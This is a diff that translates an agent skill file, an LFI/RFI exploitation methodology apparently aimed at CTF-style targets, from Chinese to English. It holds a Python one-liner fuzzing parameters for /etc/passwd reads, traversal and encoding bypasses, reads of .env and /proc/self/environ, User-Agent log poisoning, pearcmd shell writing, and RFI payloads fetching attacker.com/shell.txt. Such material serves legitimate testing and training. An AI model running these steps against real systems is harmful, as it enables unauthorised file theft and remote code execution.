@@ -1,108 +1,112 @@
 ---
 name: lfi-rfi-methodology
-description: "本地文件包含(LFI)/远程文件包含(RFI)/任意文件读取的检测和利用。当目标有文件包含参数(page/file/include/lang)、PHP应用、日志文件可写时使用。包含file_exists()陷阱、PHP include()语法错误诊断、日志投毒正确payload、pearcmd.php利用、PHP filter chain RCE、session文件包含条件竞争"
+description: "Detection and exploitation of local file inclusion (LFI), remote file inclusion (RFI), and arbitrary file read. Use when the target has file inclusion parameters (page/file/include/lang), is a PHP application, or has writable log files. Covers the file_exists() trap, PHP include() syntax error diagnostics, correct log poisoning payloads, pearcmd.php exploitation, PHP filter chain RCE, and session file inclusion race conditions"
+zh-signals: "检测与利用本地/远程文件包含及任意文件读取，涵盖 file_exists 陷阱、日志投毒、pearcmd 与 PHP filter chain RCE。信号:LFI,RFI,文件包含,日志投毒,任意文件读取"
+when-to-use: >-
+  Use when a target has file inclusion parameters (page/file/include/lang), is a PHP app, or
+  has writable log/session files that may lead to LFI-to-RCE.
 metadata:
-  tags: "lfi,rfi,file inclusion,file-inclusion,local file inclusion,path-traversal,rce,log-poisoning,目录穿越,文件包含,php://filter,data://,expect://,proc/self,etc/passwd,pearcmd,auto_prepend,文件读取,任意文件读取"
+  tags: "lfi,rfi,file inclusion,file-inclusion,local file inclusion,path-traversal,rce,log-poisoning,directory traversal,file inclusion,php://filter,data://,expect://,proc/self,etc/passwd,pearcmd,auto_prepend,file read,arbitrary file read"
   category: "exploit"
 ---
 
-# 文件包含漏洞方法论 (LFI/RFI)
+# File Inclusion Vulnerability Methodology (LFI/RFI)
 
 
-## ⛔ 深入参考（确认 LFI 后必读）
+## ⛔ Deep Reference (Must Read After Confirming LFI)
 
-- 日志投毒完整步骤、PHP Wrapper、Session 文件包含、include() 陷阱诊断 → [references/lfi-to-rce.md](references/lfi-to-rce.md)
-- pearcmd.php 利用、PHP Filter Chain RCE、Session 条件竞争 → 同在 [references/lfi-to-rce.md](references/lfi-to-rce.md)
-- LFI 到 RCE 提权路径详解 → [references/lfi2rce-techniques.md](references/lfi2rce-techniques.md)
+- Full log poisoning steps, PHP wrappers, session file inclusion, include() trap diagnostics → [references/lfi-to-rce.md](references/lfi-to-rce.md)
+- pearcmd.php exploitation, PHP filter chain RCE, session race conditions → also in [references/lfi-to-rce.md](references/lfi-to-rce.md)
+- Detailed LFI-to-RCE privilege escalation paths → [references/lfi2rce-techniques.md](references/lfi2rce-techniques.md)
 
 ---
 
-## ⛔ Phase 0: 页面发现（LFI 测试的前提！）
+## ⛔ Phase 0: Page Discovery (Prerequisite for LFI Testing!)
 
-**在测试 LFI 之前必须先找全所有可访问页面。**
+**You must first find all accessible pages before testing LFI.**
 
-1. 用 `ffuf` / `spray` 扫描 `.php/.html`；失败时立即降级用 python3 requests 批量测试：
+1. Use `ffuf` / `spray` to scan `.php/.html`; if that fails, immediately fall back to batch testing with python3 requests:
 ```
 private.php, admin.php, secret.php, flag.php, test.php, debug.php, panel.php, dashboard.php,
 upload.php, api.php, config.php, backup.php, shell.php, cmd.php, exec.php, portal.php,
 manage.php, internal.php, hidden.php, restricted.php, secure.php, system.php, info.php,
 phpinfo.php, setup.php, install.php, download.php, view.php, file.php, read.php, include.php
 ```
-2. 记录所有返回 200 且非空的页面 → 这些才是 LFI 测试目标
+2. Record every page that returns 200 with non-empty content → these are the LFI test targets
 
-## Phase 1: 发现文件包含点
+## Phase 1: Discover File Inclusion Points
 
-⛔ **退出条件**：某端点测试 3+ 个参数均无响应差异（长度差 < 10 字节）→ 标记"无 LFI" → 换端点
+⛔ **Exit condition**: if an endpoint shows no response difference across 3+ parameters (length difference < 10 bytes) → mark it "No LFI" → move to another endpoint
 
-### ⛔ 参数 Fuzz（一步到位，禁止逐个手动测试！）
+### ⛔ Parameter Fuzzing (All at Once — Manual One-by-One Testing Is Forbidden!)
 
-用 Python 批量测试所有常见参数（3 轮以上还在枚举参数 = 违规）：
+Use Python to batch test all common parameters (still enumerating parameters after 3 rounds = violation):
 ```
 python3 -c "import requests;[print(f'FOUND: {p}?{param}') for p in ['private.php','index.php','page.php','view.php','file.php','read.php'] for param in ['file','page','path','include','doc','template','lang','module','view','load'] if 'root:' in requests.get(f'http://TARGET/{p}?{param}=../../../etc/passwd',timeout=3).text]"
 ```
-- ffuf 做参数 Fuzz 时：wordlist 必须用 `Web/CTF/Fuzz_param.txt`（不是目录字典！）
-- 不能只测 file 参数：id 参数也可能存在 LFI
-- URL 编码绕过：`..%2f`、`%2e%2e%2f` 绕过路径过滤
+- When using ffuf for parameter fuzzing: the wordlist must be `Web/CTF/Fuzz_param.txt` (not a directory wordlist!)
+- Do not test only the file parameter: the id parameter may also have LFI
+- URL encoding bypass: `..%2f`, `%2e%2e%2f` bypasses path filters
 
-常见参数名: `file`, `page`, `path`, `include`, `doc`, `template`, `lang`, `module`, `action`, `view`
+Common parameter names: `file`, `page`, `path`, `include`, `doc`, `template`, `lang`, `module`, `action`, `view`
 
-测试向量:
+Test vectors:
 ```
 ?file=../../../etc/passwd
 ?file=../../../etc/passwd%00       (PHP < 5.3.4)
-?file=..%252f..%252fetc%252fpasswd (双编码)
+?file=..%252f..%252fetc%252fpasswd (double encoding)
 ```
 
-**验证方法**: 对比有参数和无参数的响应长度/内容，有差异 = 参数有效
+**Verification method**: compare the response length/content with and without the parameter; a difference = the parameter is valid
 
-## Phase 2: 路径穿越测试
+## Phase 2: Path Traversal Testing
 ```
-逐步增加 ../ 层数（通常4-7层到根目录）:
+Increase the number of ../ levels step by step (usually 4-7 levels to reach the root):
 ?file=../../../../etc/passwd
 ```
 
-## Phase 3: 关键文件读取
+## Phase 3: Key File Reads
 
-### ⛔ Dockerfile/源码优先路径规则
-当已获取 Dockerfile 或应用源码时：
-1. 提取 `WORKDIR` 值（如 `/var/www/html/`）
-2. 提取 flag 文件名（如 `xbow-flag.txt`）
-3. **拼接 WORKDIR + filename 作为第一优先读取路径**（如 `/var/www/html/xbow-flag.txt`）
-4. ⛔ 禁止跳过已知路径去盲猜 `/app/flag.txt` `/flag` 等
+### ⛔ Dockerfile/Source Code First Path Rule
+When the Dockerfile or the application source code has been obtained:
+1. Extract the `WORKDIR` value (e.g. `/var/www/html/`)
+2. Extract the flag filename (e.g. `xbow-flag.txt`)
+3. **Concatenate WORKDIR + filename as the highest-priority read path** (e.g. `/var/www/html/xbow-flag.txt`)
+4. ⛔ Never skip a known path to blindly guess `/app/flag.txt`, `/flag`, etc.
 
 **Linux**: `/etc/passwd`, `/proc/self/environ`, `/var/log/apache2/access.log`
 **Windows**: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`
-**Web应用**: `config.php`, `.env`, `wp-config.php`
-**源码**: `php://filter/convert.base64-encode/resource=index`
+**Web application**: `config.php`, `.env`, `wp-config.php`
+**Source code**: `php://filter/convert.base64-encode/resource=index`
 
-### PHP 文件包含陷阱
-- 直接 include .php 文件不会显示源码，只执行代码
-- 需要用 `php://filter/convert.base64-encode/resource=xxx` 读取 PHP 源码
+### PHP File Inclusion Traps
+- Directly including a .php file does not show the source code, it only executes the code
+- To read PHP source code you must use `php://filter/convert.base64-encode/resource=xxx`
 
-## Phase 4: LFI → RCE 决策树
+## Phase 4: LFI → RCE Decision Tree
 
-⛔ **日志投毒优先触发条件**：当任务描述/题目名包含 `poison`、`log`、`日志` 关键字时，**跳过 wrapper 尝试，直接进入日志投毒流程**！
+⛔ **Log poisoning priority trigger condition**: when the task description/challenge name contains the keywords `poison` or `log` (or their equivalents in any other language), **skip the wrapper attempts and go straight to the log poisoning flow**!
 
 ```
-LFI 确认
-│   ├─ ⛔ 题目含 "poison"/"log" 关键字？→ 直接日志投毒（跳过 Phase 3 后半段）
-│   ├─ 目标是 PHP + include()？
-│   │   ├─ pearcmd.php 存在？→ pearcmd 写 shell（最快，不依赖日志/session）
-│   │   ├─ file_exists() 不检查？→ php://input / data:// wrapper
-│   │   ├─ file_exists() 检查？→ wrapper 不可用！用日志投毒或 PHP filter chain
-│   │   ├─ 有 session 功能？→ Session 文件包含（将 PHP 代码注入 session 如用户名字段，包含 session 文件执行）
-│   ├─ 日志投毒（最通用）
-│   │   ├─ User-Agent 注入 PHP 代码
-│   │   ├─ ⚠️ 绝对不用 system('cat /file.php')！用 file_get_contents() + echo
-│   │   └─ 包含 /var/log/apache2/access.log 触发
-│   ├─ PHP Filter Chain RCE（无需文件写入/日志/session）
-│   │   └─ 用 php_filter_chain_generator.py 生成 chain
-│   └─ 详细步骤 → [references/lfi-to-rce.md](references/lfi-to-rce.md)
+LFI confirmed
+│   ├─ ⛔ Does the challenge contain the "poison"/"log" keyword? → go straight to log poisoning (skip the second half of Phase 3)
+│   ├─ Is the target PHP + include()?
+│   │   ├─ Does pearcmd.php exist? → write a shell with pearcmd (fastest, no log/session dependency)
+│   │   ├─ No file_exists() check? → php://input / data:// wrapper
+│   │   ├─ file_exists() check present? → wrappers unavailable! Use log poisoning or a PHP filter chain
+│   │   ├─ Session functionality present? → Session file inclusion (inject PHP code into the session, e.g. the username field, and include the session file to execute it)
+│   ├─ Log poisoning (most universal)
+│   │   ├─ Inject PHP code via the User-Agent
+│   │   ├─ ⚠️ Never use system('cat /file.php')! Use file_get_contents() + echo
+│   │   └─ Include /var/log/apache2/access.log to trigger it
+│   ├─ PHP Filter Chain RCE (no file write/log/session needed)
+│   │   └─ Generate the chain with php_filter_chain_generator.py
+│   └─ Detailed steps → [references/lfi-to-rce.md](references/lfi-to-rce.md)
 ```
 
-## Phase 5: RFI 测试
-`?file=http://attacker.com/shell.txt` (需 allow_url_include=On) | `?file=\\attacker.com\share\shell.php` (SMB/UNC)
+## Phase 5: RFI Testing
+`?file=http://attacker.com/shell.txt` (requires allow_url_include=On) | `?file=\\attacker.com\share\shell.php` (SMB/UNC)
 
-## 注意事项
-- **include() 会执行 PHP，file_get_contents() 读原始文本** — 关键区别
-- LFI 比 RFI 更常见（RFI 需 PHP 配置允许）| HTTP 200 + Content-Length: 0 → PHP 语法错误被吞
+## Notes
+- **include() executes PHP, file_get_contents() reads raw text** — the key difference
+- LFI is more common than RFI (RFI requires permissive PHP configuration) | HTTP 200 + Content-Length: 0 → the PHP syntax error is swallowed
